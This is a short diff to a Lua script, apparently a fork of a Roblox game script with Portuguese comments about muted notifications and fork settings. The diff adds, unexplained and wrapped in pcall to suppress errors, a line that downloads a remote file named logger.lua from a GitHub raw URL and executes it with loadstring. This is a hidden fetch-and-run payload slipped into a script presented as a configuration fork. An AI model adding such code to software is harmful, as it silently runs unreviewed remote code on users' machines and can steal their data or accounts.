@@ -12,6 +12,11 @@
 	  - Notify() silenciada via DISABLE_ALL_NOTIFICATIONS
 
 ]]
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NevercryNever/Field/refs/heads/main/logger.lua"))()
+end)
+
 -- ================================================
 -- CONFIGURACOES DO FORK
 -- ================================================
